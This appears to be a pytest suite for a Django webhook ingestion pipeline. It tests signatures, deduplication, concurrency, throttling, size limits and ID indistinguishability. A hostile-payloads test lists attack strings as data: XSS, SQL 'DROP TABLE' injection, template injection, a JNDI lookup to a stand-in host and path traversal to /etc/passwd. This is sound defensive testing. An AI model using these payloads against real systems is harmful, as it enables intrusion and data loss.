"""The webhook endpoints, end to end (SPEC §7.1, SECURITY-BASELINE §§2, 4, 7).

Driven through a real adapter (``fake_adapter.py``) registered in the real
registry, so what these tests exercise is the actual path a delivery takes:

    endpoint → size cap → ban → signature → dedup → event log → dispatch seam

Mocking the adapter would prove the endpoint calls something; this proves the
framework works.
"""

import json
import threading
import time
from typing import Any

import pytest
from django.db import connection as db_connection
from django.test import Client
from django.test.utils import override_settings
from django.urls import NoReverseMatch, reverse

from apps.channels import ingest
from apps.channels.models import ChannelConnection, WebhookEventLog, WebhookEventStatus
from apps.channels.tests.fake_adapter import SECRET_HEADER, SIGNATURE_HEADER, registered, sign
from apps.common.platforms import Platform

pytestmark = pytest.mark.django_db

TELEGRAM_URL = "/webhooks/telegram/"


def _route_for(platform: str, connection_id: Any) -> str:
    """The per-connection webhook URL for a platform that has one."""
    if platform == Platform.EMAIL:
        return reverse("webhook_email", kwargs={"provider": "resend", "connection_id": connection_id})
    return reverse("webhook_sms", kwargs={"connection_id": connection_id})


def body_for(*event_ids: str, text: str = "hello") -> bytes:
    events = [{"id": event_id, "user": "u1", "text": text} for event_id in event_ids]
    return json.dumps({"events": events}).encode()


def post(client: Client, url: str, body: bytes, *, secret: str, signature: str | None = None) -> Any:
    """A delivery signed the way a correctly configured platform would sign it."""
    headers = {SECRET_HEADER: secret, SIGNATURE_HEADER: signature or sign(secret, body)}
    return client.post(url, data=body, content_type="application/json", headers=headers)


@pytest.fixture
def collected() -> list[Any]:
    """A processor registered on the contract-6 seam, collecting what it is given."""
    received: list[Any] = []

    def processor(conn: ChannelConnection, events: Any) -> None:
        received.extend(events)

    ingest.register_processor(processor, name="test-collector")
    return received


class TestHappyPath:
    def test_a_valid_delivery_is_logged_and_dispatched(
        self, client: Client, connection: ChannelConnection, secret: str, fake_adapter: Any, collected: list[Any]
    ) -> None:
        response = post(client, TELEGRAM_URL, body_for("e1"), secret=secret)

        assert response.status_code == 200
        row = WebhookEventLog.objects.get()
        assert row.connection == connection
        assert row.provider_event_id == "e1"
        assert row.status == WebhookEventStatus.PROCESSED
        assert row.processed_at is not None
        assert row.raw == {"id": "e1", "user": "u1", "text": "hello"}
        assert [event.provider_event_id for event in collected] == ["e1"]

    def test_several_events_in_one_delivery_all_land(
        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
    ) -> None:
        response = post(client, TELEGRAM_URL, body_for("a", "b", "c"), secret=secret)
        assert response.status_code == 200
        assert WebhookEventLog.objects.count() == 3
        assert len(collected) == 3

    def test_no_csrf_token_is_required(self, connection: ChannelConnection, secret: str, fake_adapter: Any) -> None:
        """The signature is the credential; there is no session to protect."""
        strict = Client(enforce_csrf_checks=True)
        assert post(strict, TELEGRAM_URL, body_for("e1"), secret=secret).status_code == 200

    def test_a_valid_delivery_answers_within_100ms(
        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
    ) -> None:
        # One warm-up so connection setup and template/URL caches are not being
        # measured, then the best of three: the assertion is about the code
        # path's cost, not about CI's worst scheduling moment.
        post(client, TELEGRAM_URL, body_for("warm"), secret=secret)
        timings = []
        for index in range(3):
            start = time.perf_counter()
            response = post(client, TELEGRAM_URL, body_for(f"t{index}"), secret=secret)
            timings.append(time.perf_counter() - start)
            assert response.status_code == 200
        assert min(timings) < 0.1, f"fastest of three was {min(timings):.3f}s"


class TestDeduplication:
    def test_a_repeated_delivery_is_processed_once(
        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
    ) -> None:
        for _ in range(3):
            assert post(client, TELEGRAM_URL, body_for("e1"), secret=secret).status_code == 200

        assert WebhookEventLog.objects.count() == 1
        assert len(collected) == 1

    def test_a_partly_repeated_batch_processes_only_the_new_events(
        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
    ) -> None:
        post(client, TELEGRAM_URL, body_for("a"), secret=secret)
        post(client, TELEGRAM_URL, body_for("a", "b"), secret=secret)
        assert sorted(WebhookEventLog.objects.values_list("provider_event_id", flat=True)) == ["a", "b"]
        assert [event.provider_event_id for event in collected] == ["a", "b"]

    def test_an_event_without_an_id_is_not_logged(
        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
    ) -> None:
        # The fake adapter drops these while parsing, which is the contract:
        # an event with no id cannot be deduplicated.
        body = json.dumps({"events": [{"user": "u1", "text": "hi"}]}).encode()
        assert post(client, TELEGRAM_URL, body, secret=secret).status_code == 200
        assert WebhookEventLog.objects.count() == 0


@pytest.mark.django_db(transaction=True)
class TestConcurrentDelivery:
    def test_simultaneous_duplicates_process_exactly_once(self) -> None:
        """The acceptance criterion. The unique constraint is what makes it true."""
        from tests.support import create_tenancy

        tenancy = create_tenancy("concurrent")
        connection = ChannelConnection(
            workspace=tenancy.workspace,
            platform=Platform.TELEGRAM,
            display_name="Bot",
            external_id="concurrent-bot",
        )
        secret = connection.rotate_webhook_secret()
        connection.save()

        dispatched: list[str] = []
        lock = threading.Lock()

        def processor(conn: ChannelConnection, events: Any) -> None:
            with lock:
                dispatched.extend(event.provider_event_id for event in events)

        ingest.register_processor(processor, name="concurrent-collector")

        workers = 8
        # Released together, so the inserts genuinely race rather than queueing.
        barrier = threading.Barrier(workers)
        statuses: list[int] = []

        def deliver() -> None:
            try:
                barrier.wait(timeout=10)
                response = post(Client(), TELEGRAM_URL, body_for("race"), secret=secret)
                with lock:
                    statuses.append(response.status_code)
            finally:
                # Each thread opened its own connection; a transactional test
                # leaves them behind otherwise and the next test blocks on
                # TRUNCATE.
                db_connection.close()

        try:
            with registered(Platform.TELEGRAM):
                threads = [threading.Thread(target=deliver) for _ in range(workers)]
                for thread in threads:
                    thread.start()
                for thread in threads:
                    thread.join(timeout=30)

            assert statuses == [200] * workers
            assert WebhookEventLog.objects.filter(connection=connection).count() == 1
            assert dispatched == ["race"]
        finally:
            ingest.unregister_processor("concurrent-collector")
            WebhookEventLog.objects.all().delete()
            connection.delete()
            tenancy.workspace.delete()
            tenancy.organization.delete()


class TestSignatureFailures:
    def test_a_wrong_signature_is_403_and_writes_nothing(self, client: Client, secret: str, fake_adapter: Any) -> None:
        response = post(client, TELEGRAM_URL, body_for("e1"), secret=secret, signature="sha256=" + "0" * 64)
        assert response.status_code == 403
        assert WebhookEventLog.objects.count() == 0

    def test_a_missing_signature_is_403(self, client: Client, secret: str, fake_adapter: Any) -> None:
        response = client.post(
            TELEGRAM_URL,
            data=body_for("e1"),
            content_type="application/json",
            headers={SECRET_HEADER: secret},
        )
        assert response.status_code == 403

    def test_an_unknown_connection_answers_exactly_like_a_bad_signature(
        self, client: Client, secret: str, fake_adapter: Any
    ) -> None:
        """No existence oracle: the two cases must be indistinguishable."""
        body = body_for("e1")
        unknown = post(client, TELEGRAM_URL, body, secret="not-a-real-secret")
        bad_signature = post(client, TELEGRAM_URL, body, secret=secret, signature="sha256=" + "0" * 64)

        assert unknown.status_code == bad_signature.status_code == 403
        assert unknown.content == bad_signature.content

    def test_a_disabled_connection_stops_ingesting_on_the_shared_route(
        self, client: Client, connection: ChannelConnection, secret: str, fake_adapter: Any
    ) -> None:
        """Switching a channel off has to actually switch it off."""
        connection.status = "disabled"
        connection.save(update_fields=["status"])
        assert post(client, TELEGRAM_URL, body_for("e1"), secret=secret).status_code == 403
        assert WebhookEventLog.objects.count() == 0

    def test_a_disabled_connection_stops_ingesting_on_a_per_connection_route(
        self, client: Client, connection: ChannelConnection
    ) -> None:
        with registered(Platform.SMS):
            sms = ChannelConnection(
                workspace=connection.workspace,
                platform=Platform.SMS,
                display_name="Number",
                external_id="+15551234",
                status="disabled",
            )
            sms_secret = sms.rotate_webhook_secret()
            sms.save()
            url = reverse("webhook_sms", kwargs={"connection_id": sms.pk})
            assert post(client, url, body_for("e1"), secret=sms_secret).status_code == 403

    def test_an_unknown_connection_id_is_403_not_404(self, client: Client, fake_adapter: Any) -> None:
        with registered(Platform.SMS):
            url = reverse("webhook_sms", kwargs={"connection_id": "11111111-1111-1111-1111-111111111111"})
            assert post(client, url, body_for("e1"), secret="anything").status_code == 403


class TestIdIndistinguishability:
    """The property that stands in for the IDOR sweep on these two routes.

    ``tests/idor.py`` waives ``webhook_sms`` and ``webhook_email`` because an
    unauthenticated endpoint has no session tenant to compare a connection
    against, and cannot answer 404 without breaking ingestion. What replaces
    that guarantee is this: **the response must not depend on whether the
    connection id names something real.** If this class is deleted, the waiver
    has to go with it.

    Both states are covered, because the interesting one is the state this
    layer actually ships in. With no adapter registered — every platform, right
    now — an earlier version of the pipeline looked the connection up first, so
    a real id reached a 503 while an unknown id had already been refused with
    403. That is an unauthenticated existence oracle for connection ids, and it
    is why ``_ingest_for_connection`` resolves the adapter before it touches the
    database.
    """

    @staticmethod
    def _pair(client: Client, url_for_real: str, url_for_unknown: str, secret: str) -> tuple[Any, Any]:
        body = body_for("e1")
        return (
            post(client, url_for_real, body, secret=secret, signature="sha256=" + "0" * 64),
            post(client, url_for_unknown, body, secret=secret, signature="sha256=" + "0" * 64),
        )

    @pytest.mark.parametrize("platform", [Platform.SMS, Platform.EMAIL])
    def test_a_real_and_an_unknown_id_look_identical_with_an_adapter(
        self, client: Client, connection: ChannelConnection, platform: str
    ) -> None:
        real = ChannelConnection(
            workspace=connection.workspace,
            platform=platform,
            display_name="Real",
            external_id=f"real-{platform}",
        )
        secret = real.rotate_webhook_secret()
        real.save()

        with registered(platform):
            real_response, unknown_response = self._pair(
                client,
                _route_for(platform, real.pk),
                _route_for(platform, "11111111-1111-1111-1111-111111111111"),
                secret,
            )

        assert real_response.status_code == unknown_response.status_code == 403
        assert real_response.content == unknown_response.content

    @pytest.mark.parametrize("platform", [Platform.SMS, Platform.EMAIL])
    def test_a_real_and_an_unknown_id_look_identical_without_an_adapter(
        self, client: Client, connection: ChannelConnection, platform: str
    ) -> None:
        """The state this layer ships in: no adapter exists for any platform."""
        real = ChannelConnection(
            workspace=connection.workspace,
            platform=platform,
            display_name="Real",
            external_id=f"real-{platform}",
        )
        secret = real.rotate_webhook_secret()
        real.save()

        real_response, unknown_response = self._pair(
            client,
            _route_for(platform, real.pk),
            _route_for(platform, "11111111-1111-1111-1111-111111111111"),
            secret,
        )

        assert real_response.status_code == unknown_response.status_code == 503
        assert real_response.content == unknown_response.content

    @pytest.mark.parametrize("platform", [Platform.SMS, Platform.EMAIL])
    def test_a_disabled_connection_is_indistinguishable_from_an_unknown_one(
        self, client: Client, connection: ChannelConnection, platform: str
    ) -> None:
        """Otherwise the status leaks whether a real id is switched on."""
        disabled = ChannelConnection(
            workspace=connection.workspace,
            platform=platform,
            display_name="Disabled",
            external_id=f"disabled-{platform}",
            status="disabled",
        )
        secret = disabled.rotate_webhook_secret()
        disabled.save()

        with registered(platform):
            disabled_response, unknown_response = self._pair(
                client,
                _route_for(platform, disabled.pk),
                _route_for(platform, "11111111-1111-1111-1111-111111111111"),
                secret,
            )

        assert disabled_response.status_code == unknown_response.status_code == 403
        assert disabled_response.content == unknown_response.content


class TestEmailRoute:
    """SPEC §6.7's bounce/delivery callback. Outbound-only platform, inbound route.

    The ``provider`` segment (resend / ses / smtp) selects a payload shape, not a
    tenant's object: it is not a credential and is not used for lookup, so an
    unknown value simply reaches an adapter that will not recognise the body.
    """

    @staticmethod
    def _connection(workspace: Any) -> tuple[ChannelConnection, str]:
        connection = ChannelConnection(
            workspace=workspace,
            platform=Platform.EMAIL,
            display_name="Sending domain",
            external_id="mail.example.test",
        )
        secret = connection.rotate_webhook_secret()
        connection.save()
        return connection, secret

    def test_a_valid_delivery_is_logged_and_dispatched(
        self, client: Client, connection: ChannelConnection, collected: list[Any]
    ) -> None:
        email, secret = self._connection(connection.workspace)
        with registered(Platform.EMAIL):
            url = reverse("webhook_email", kwargs={"provider": "resend", "connection_id": email.pk})
            response = post(client, url, body_for("bounce-1"), secret=secret)

        assert response.status_code == 200
        assert WebhookEventLog.objects.get().connection == email
        assert [event.provider_event_id for event in collected] == ["bounce-1"]

    def test_a_bad_signature_is_403_and_writes_nothing(self, client: Client, connection: ChannelConnection) -> None:
        email, secret = self._connection(connection.workspace)
        with registered(Platform.EMAIL):
            url = reverse("webhook_email", kwargs={"provider": "resend", "connection_id": email.pk})
            response = post(client, url, body_for("e1"), secret=secret, signature="sha256=" + "0" * 64)

        assert response.status_code == 403
        assert WebhookEventLog.objects.count() == 0

    @pytest.mark.parametrize("provider", ["resend", "ses", "smtp", "unknown-provider", "../../etc"])
    def test_the_provider_segment_does_not_change_who_is_authorised(
        self, client: Client, connection: ChannelConnection, provider: str
    ) -> None:
        """It selects a body shape; the connection id and the signature decide access."""
        email, secret = self._connection(connection.workspace)
        with registered(Platform.EMAIL):
            try:
                url = reverse("webhook_email", kwargs={"provider": provider, "connection_id": email.pk})
            except NoReverseMatch:
                # A segment the URL converter will not build is not routable at
                # all, which is the strongest possible answer.
                return
            assert post(client, url, body_for("e1"), secret=secret).status_code == 200

    def test_a_get_is_not_allowed(self, client: Client, connection: ChannelConnection) -> None:
        email, _ = self._connection(connection.workspace)
        url = reverse("webhook_email", kwargs={"provider": "resend", "connection_id": email.pk})
        assert client.get(url).status_code == 405

    def test_a_disabled_connection_stops_ingesting(self, client: Client, connection: ChannelConnection) -> None:
        email, secret = self._connection(connection.workspace)
        email.status = "disabled"
        email.save(update_fields=["status"])
        with registered(Platform.EMAIL):
            url = reverse("webhook_email", kwargs={"provider": "resend", "connection_id": email.pk})
            assert post(client, url, body_for("e1"), secret=secret).status_code == 403


class TestThrottle:
    @override_settings(WEBHOOK_SIGNATURE_FAILURE_LIMIT=3)
    def test_repeated_failures_get_the_source_banned(self, client: Client, secret: str, fake_adapter: Any) -> None:
        body = body_for("e1")
        for _ in range(4):
            assert post(client, TELEGRAM_URL, body, secret=secret, signature="sha256=bad").status_code == 403

        banned = post(client, TELEGRAM_URL, body, secret=secret)
        assert banned.status_code == 429
        assert banned["Retry-After"]

    @override_settings(WEBHOOK_SIGNATURE_FAILURE_LIMIT=3)
    def test_a_valid_delivery_never_counts_toward_the_ban(
        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
    ) -> None:
        for index in range(10):
            assert post(client, TELEGRAM_URL, body_for(f"e{index}"), secret=secret).status_code == 200


class TestBodyLimits:
    @override_settings(WEBHOOK_MAX_BODY_BYTES=64)
    def test_an_oversized_body_is_rejected_before_any_database_work(
        self, client: Client, secret: str, fake_adapter: Any, django_assert_num_queries: Any
    ) -> None:
        body = json.dumps({"events": [{"id": "e1", "user": "u1", "text": "x" * 500}]}).encode()
        with django_assert_num_queries(0):
            response = post(client, TELEGRAM_URL, body, secret=secret)
        assert response.status_code == 413

    @override_settings(WEBHOOK_MAX_JSON_DEPTH=5)
    def test_a_nesting_bomb_is_rejected(self, client: Client, secret: str, fake_adapter: Any) -> None:
        body = b'{"events":' + b"[" * 500 + b"]" * 500 + b"}"
        assert post(client, TELEGRAM_URL, body, secret=secret).status_code == 400

    def test_a_body_that_is_not_json_is_400(self, client: Client, secret: str, fake_adapter: Any) -> None:
        assert post(client, TELEGRAM_URL, b"not json at all", secret=secret).status_code == 400
        assert WebhookEventLog.objects.count() == 0


class TestHostilePayloads:
    """Every field is attacker-controlled (SECURITY-BASELINE §2)."""

    INJECTIONS = [
        "<script>alert(1)</script>",
        "'; DROP TABLE channels_channel_connection; --",
        "{{ 7*7 }}",
        "${jndi:ldap://evil.test/x}",
        "../../../../etc/passwd",
        "\x00\x01\x02",
        "👩‍💻" * 50,
        "%s%s%s%n",
    ]

    @pytest.mark.parametrize("injection", INJECTIONS)
    def test_injection_strings_survive_as_plain_data(
        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any], injection: str
    ) -> None:
        body = json.dumps({"events": [{"id": injection, "user": injection, "text": injection}]}).encode()
        response = post(client, TELEGRAM_URL, body, secret=secret)

        assert response.status_code == 200
        row = WebhookEventLog.objects.get()
        # Stored verbatim, interpreted by nothing. Escaping is the renderer's
        # job, and Django templates autoescape by default. The one exception is
        # NUL, which PostgreSQL will not store at all — see security.scrub_nulls.
        assert row.provider_event_id == injection.replace("\x00", "")[:200]
        assert collected[0].payload.text == injection

    @pytest.mark.parametrize(
        "payload",
        [
            {},
            {"events": None},
            {"events": "not a list"},
            {"events": [None, 1, "two", []]},
            {"events": [{"id": 1, "user": 2}]},  # wrong types
            {"events": [{"id": "", "user": ""}]},  # empty strings
            {"events": [{"id": "ok", "user": "u", "text": {"nested": "object"}}]},
            {"events": [{"id": "ok", "user": "u", "extra": [1, 2, 3]}]},
            {"unexpected": "key"},
        ],
    )
    def test_a_malformed_payload_never_5xxs(
        self, client: Client, secret: str, fake_adapter: Any, payload: dict[str, Any]
    ) -> None:
        response = post(client, TELEGRAM_URL, json.dumps(payload).encode(), secret=secret)
        assert response.status_code == 200

    def test_an_oversized_raw_payload_is_truncated_in_the_log(
        self, client: Client, secret: str, fake_adapter: Any
    ) -> None:
        body = json.dumps({"events": [{"id": "e1", "user": "u1", "text": "x" * 20000}]}).encode()
        assert post(client, TELEGRAM_URL, body, secret=secret).status_code == 200
        assert WebhookEventLog.objects.get().raw == {"_truncated": True, "_bytes": pytest.approx(20040, abs=200)}

    def test_a_nul_byte_does_not_500_the_endpoint(
        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
    ) -> None:
        """PostgreSQL refuses NUL outright, so an unscrubbed one is a 500 — and a
        platform answered with 5xx retries the same body until it gives up on
        the webhook entirely."""
        body = json.dumps({"events": [{"id": "e\u00001", "user": "u\u00001", "text": "hi\u0000there"}]}).encode()
        response = post(client, TELEGRAM_URL, body, secret=secret)

        assert response.status_code == 200
        assert WebhookEventLog.objects.get().provider_event_id == "e1"

    def test_a_parser_that_raises_does_not_5xx(
        self, client: Client, secret: str, fake_adapter: Any, monkeypatch: Any
    ) -> None:
        def explode(self: Any, request: Any, conn: Any) -> Any:
            raise RuntimeError("adapter bug")

        monkeypatch.setattr(fake_adapter, "parse_events", explode)
        assert post(client, TELEGRAM_URL, body_for("e1"), secret=secret).status_code == 200


class TestEventIdHandling:
    """The dedup key: what gets stored, and what must not silently collide."""

    def test_an_id_of_only_nul_bytes_is_dropped_rather_than_stored_as_empty(
        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
    ) -> None:
        """It used to pass the truthy "no id" guard and be scrubbed to '' after.

        The row then occupied (connection, '') and every later event whose id
        also scrubbed to empty collided with it and vanished as a duplicate.
        """
        first = json.dumps({"events": [{"id": "\u0000", "user": "u1", "text": "one"}]}).encode()
        second = json.dumps({"events": [{"id": "\u0000\u0000", "user": "u1", "text": "two"}]}).encode()

        assert post(client, TELEGRAM_URL, first, secret=secret).status_code == 200
        assert post(client, TELEGRAM_URL, second, secret=secret).status_code == 200

        # Neither is stored — an event with no usable id cannot be deduplicated —
        # and, crucially, the second is not silently swallowed by the first.
        assert WebhookEventLog.objects.count() == 0
        assert collected == []

    def test_two_long_ids_sharing_a_prefix_stay_distinct(
        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
    ) -> None:
        """Truncating to the column width narrowed the dedup key silently."""
        prefix = "x" * 250
        body = json.dumps(
            {
                "events": [
                    {"id": prefix + "-one", "user": "u1", "text": "one"},
                    {"id": prefix + "-two", "user": "u1", "text": "two"},
                ]
            }
        ).encode()

        assert post(client, TELEGRAM_URL, body, secret=secret).status_code == 200
        assert WebhookEventLog.objects.count() == 2
        assert len(collected) == 2
        stored = list(WebhookEventLog.objects.values_list("provider_event_id", flat=True))
        assert all(value.startswith("sha256:") for value in stored)
        assert len(set(stored)) == 2

    def test_a_long_id_still_deduplicates(
        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
    ) -> None:
        body = json.dumps({"events": [{"id": "y" * 400, "user": "u1", "text": "hi"}]}).encode()
        post(client, TELEGRAM_URL, body, secret=secret)
        post(client, TELEGRAM_URL, body, secret=secret)
        assert WebhookEventLog.objects.count() == 1
        assert len(collected) == 1


class TestRawPayloadStorage:
    def test_a_payload_the_json_encoder_would_refuse_does_not_500(
        self, client: Client, secret: str, fake_adapter: Any, monkeypatch: Any
    ) -> None:
        """The size check used default=str, so a strict-encoder failure escaped
        both except clauses and surfaced as a 500 on the public endpoint."""
        from datetime import UTC, datetime

        from apps.channels.events import EventPayload, EventType, NormalizedEvent

        def parse(self: Any, request: Any, conn: Any) -> list[NormalizedEvent]:
            return [
                NormalizedEvent(
                    type=EventType.MESSAGE,
                    connection=conn,
                    platform_user_id="u1",
                    provider_event_id="e1",
                    timestamp=datetime.now(UTC),
                    payload=EventPayload(text="hi"),
                    raw={"seen_at": datetime.now(UTC)},
                )
            ]

        monkeypatch.setattr(fake_adapter, "parse_events", parse)
        response = post(client, TELEGRAM_URL, body_for("e1"), secret=secret)

        assert response.status_code == 200
        assert WebhookEventLog.objects.get().raw == {"_unserializable": True}

    def test_the_size_cap_counts_bytes_not_characters(self) -> None:
        """A multi-byte payload used to pass a cap named for bytes."""
        from apps.channels.views_webhooks import MAX_RAW_BYTES, _bounded_raw

        # Comfortably under the cap in characters, over it in UTF-8 bytes.
        payload = {"text": "\u4e16" * (MAX_RAW_BYTES // 2)}
        assert _bounded_raw(payload)["_truncated"] is True


class TestMultiConnectionDelivery:
    def test_events_are_logged_against_the_connection_they_name(
        self, client: Client, connection: ChannelConnection, secret: str, fake_adapter: Any
    ) -> None:
        """One Meta delivery legitimately spans several pages of the same app."""
        from datetime import UTC, datetime

        from apps.channels.events import EventType, NormalizedEvent

        second = ChannelConnection(
            workspace=connection.workspace,
            platform=Platform.TELEGRAM,
            display_name="Other bot",
            external_id="bot-other",
        )
        second.rotate_webhook_secret()
        second.save()

        seen: list[tuple[Any, list[str]]] = []
        ingest.register_processor(
            lambda conn, events: seen.append((conn.pk, [e.provider_event_id for e in events])),
            name="grouping",
        )

        def parse(self: Any, request: Any, conn: Any) -> list[NormalizedEvent]:
            return [
                NormalizedEvent(
                    type=EventType.MESSAGE,
                    connection=owner,
                    platform_user_id="u1",
                    provider_event_id=event_id,
                    timestamp=datetime.now(UTC),
                )
                for owner, event_id in ((conn, "for-first"), (second, "for-second"))
            ]

        monkeypatch_target = fake_adapter
        original = monkeypatch_target.parse_events
        monkeypatch_target.parse_events = parse
        try:
            assert post(client, TELEGRAM_URL, body_for("ignored"), secret=secret).status_code == 200
        finally:
            monkeypatch_target.parse_events = original

        rows = dict(WebhookEventLog.objects.values_list("provider_event_id", "connection_id"))
        assert rows == {"for-first": connection.pk, "for-second": second.pk}
        assert sorted(seen) == sorted([(connection.pk, ["for-first"]), (second.pk, ["for-second"])])

    def test_an_event_naming_another_platforms_connection_is_dropped(
        self, client: Client, connection: ChannelConnection, secret: str, fake_adapter: Any, collected: list[Any]
    ) -> None:
        """The signature was verified by this platform's adapter, and covers only it."""
        from datetime import UTC, datetime

        from apps.channels.events import EventType, NormalizedEvent

        foreign = ChannelConnection(
            workspace=connection.workspace,
            platform=Platform.MESSENGER,
            display_name="A page",
            external_id="page-1",
        )
        foreign.rotate_webhook_secret()
        foreign.save()

        def parse(self: Any, request: Any, conn: Any) -> list[NormalizedEvent]:
            return [
                NormalizedEvent(
                    type=EventType.MESSAGE,
                    connection=foreign,
                    platform_user_id="u1",
                    provider_event_id="smuggled",
                    timestamp=datetime.now(UTC),
                )
            ]

        original = fake_adapter.parse_events
        fake_adapter.parse_events = parse
        try:
            assert post(client, TELEGRAM_URL, body_for("ignored"), secret=secret).status_code == 200
        finally:
            fake_adapter.parse_events = original

        assert WebhookEventLog.objects.count() == 0
        assert collected == []


class TestDispatchSeam:
    def test_no_processor_registered_is_a_no_op(self, client: Client, secret: str, fake_adapter: Any) -> None:
        """The state this issue ships in: logged, dropped, 200."""
        assert post(client, TELEGRAM_URL, body_for("e1"), secret=secret).status_code == 200
        assert WebhookEventLog.objects.get().status == WebhookEventStatus.PROCESSED

    def test_a_processor_that_raises_marks_the_event_failed_but_still_200s(
        self, client: Client, secret: str, fake_adapter: Any
    ) -> None:
        def explode(conn: Any, events: Any) -> None:
            raise RuntimeError("persistence is down")

        ingest.register_processor(explode, name="exploder")
        response = post(client, TELEGRAM_URL, body_for("e1"), secret=secret)

        assert response.status_code == 200
        assert WebhookEventLog.objects.get().status == WebhookEventStatus.FAILED

    def test_processors_run_in_registration_order(self, client: Client, secret: str, fake_adapter: Any) -> None:
        order: list[str] = []
        ingest.register_processor(lambda c, e: order.append("first"), name="first")
        ingest.register_processor(lambda c, e: order.append("second"), name="second")
        post(client, TELEGRAM_URL, body_for("e1"), secret=secret)
        assert order == ["first", "second"]

    def test_one_failing_processor_does_not_stop_the_next(self, client: Client, secret: str, fake_adapter: Any) -> None:
        reached: list[str] = []

        def explode(conn: Any, events: Any) -> None:
            raise RuntimeError("boom")

        ingest.register_processor(explode, name="exploder")
        ingest.register_processor(lambda c, e: reached.append("yes"), name="after")
        post(client, TELEGRAM_URL, body_for("e1"), secret=secret)
        assert reached == ["yes"]


class TestNoAdapter:
    def test_a_platform_with_no_adapter_answers_503(self, client: Client, secret: str) -> None:
        """The shipped state for every platform. Retryable, and not a 403."""
        response = post(client, "/webhooks/whatsapp/", body_for("e1"), secret=secret)
        assert response.status_code == 503

    def test_an_unknown_platform_is_404(self, client: Client) -> None:
        assert client.post("/webhooks/carrier-pigeon/", data=b"{}", content_type="application/json").status_code == 404


class TestMetaVerification:
    URL = "/webhooks/instagram/"

    @override_settings(PLATFORM_CREDENTIALS_FROM_ENV={"instagram": {"verify_token": "let-me-in"}})
    def test_the_challenge_is_echoed_for_the_right_token(self, client: Client) -> None:
        response = client.get(
            self.URL,
            {"hub.mode": "subscribe", "hub.verify_token": "let-me-in", "hub.challenge": "1158201444"},
        )
        assert response.status_code == 200
        assert response.content == b"1158201444"
        assert response["X-Content-Type-Options"] == "nosniff"

    @override_settings(PLATFORM_CREDENTIALS_FROM_ENV={"instagram": {"verify_token": "let-me-in"}})
    def test_a_wrong_token_is_403(self, client: Client) -> None:
        response = client.get(
            self.URL,
            {"hub.mode": "subscribe", "hub.verify_token": "guess", "hub.challenge": "1158201444"},
        )
        assert response.status_code == 403

    @override_settings(PLATFORM_CREDENTIALS_FROM_ENV={"instagram": {"verify_token": "let-me-in"}})
    def test_the_wrong_mode_is_403(self, client: Client) -> None:
        response = client.get(
            self.URL,
            {"hub.mode": "unsubscribe", "hub.verify_token": "let-me-in", "hub.challenge": "1"},
        )
        assert response.status_code == 403

    @override_settings(PLATFORM_CREDENTIALS_FROM_ENV={"instagram": {"verify_token": "let-me-in"}})
    @pytest.mark.parametrize("challenge", ["<script>alert(1)</script>", "", "abc", "1" * 100])
    def test_only_a_short_numeric_challenge_is_echoed(self, client: Client, challenge: str) -> None:
        """Reflecting arbitrary caller-supplied content is not a thing to offer."""
        response = client.get(
            self.URL,
            {"hub.mode": "subscribe", "hub.verify_token": "let-me-in", "hub.challenge": challenge},
        )
        assert response.status_code == 403

    @override_settings(PLATFORM_CREDENTIALS_FROM_ENV={"instagram": {"verify_token": "let-me-in"}})
    @override_settings(WEBHOOK_SIGNATURE_FAILURE_LIMIT=2)
    def test_a_banned_source_cannot_keep_guessing_the_verify_token(self, client: Client) -> None:
        """This path records failures; for a while it was the only one that
        never checked for a ban, so guessing here was free forever."""
        wrong = {"hub.mode": "subscribe", "hub.verify_token": "guess", "hub.challenge": "1"}
        for _ in range(3):
            assert client.get(self.URL, wrong).status_code == 403

        banned = client.get(self.URL, wrong)
        assert banned.status_code == 429
        assert banned["Retry-After"]

    @override_settings(PLATFORM_CREDENTIALS_FROM_ENV={})
    def test_an_unconfigured_platform_404s(self, client: Client) -> None:
        """The /internal/tick discipline: no token means the endpoint is not there."""
        response = client.get(
            self.URL,
            {"hub.mode": "subscribe", "hub.verify_token": "anything", "hub.challenge": "1"},
        )
        assert response.status_code == 404


class TestMethods:
    def test_get_is_not_allowed_on_a_per_connection_route(self, client: Client, connection: ChannelConnection) -> None:
        url = reverse("webhook_sms", kwargs={"connection_id": connection.pk})
        assert client.get(url).status_code == 405

    def test_put_is_not_allowed_on_the_shared_route(self, client: Client) -> None:
        assert client.put(TELEGRAM_URL, data=b"{}", content_type="application/json").status_code == 405
